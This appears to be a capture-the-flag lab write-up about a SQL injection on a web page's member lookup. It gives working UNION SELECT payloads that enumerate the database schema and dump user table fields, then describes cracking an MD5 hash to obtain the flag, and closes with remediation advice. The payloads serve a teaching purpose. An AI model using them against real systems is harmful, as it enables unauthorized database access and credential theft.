# situation

## http://192.168.56.101/?page=member

we find that sql return errors 

we try sql requests with an id as it is mandatory and 
we can make a union to continue the request and gather more info
we look for infos on information information_schema

https://learn.microsoft.com/fr-fr/sql/relational-databases/system-information-schema-views/columns-transact-sql?view=sql-server-ver16

we look for user infos so we find each column_name in usr we need to fin 2 by 2 and we find in first name information to decrypt flag and in surname encrypted flage

0 UNION  select table_name, column_name FROM information_schema.columns  


ID: 0 UNION select Commentaire, countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

decrypt in md5 we find  FortyTwo 

so we encrypte in sha256 fortytwo

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

https://md5decrypt.net/Sha256/#answer
https://md5decrypt.net/#answer

# problem

All sensitive information stored in the database is accessible to anyone.

# solution

Use an ORM (Object-Relational Mapping) library: An ORM can help to abstract away the SQL and provide a safe and secure way to interact with the database.

Validate and sanitize user input: By validating and sanitizing user input, you can prevent malicious code from being included in SQL statements.

Use a whitelist approach: Only allow specific, known good inputs and prevent all other inputs.

In SQL, we can specify and limit access to certain tables based on the IP that makes the request. This prevents if a vulnerability is discovered by hacker, the entire database from being usable.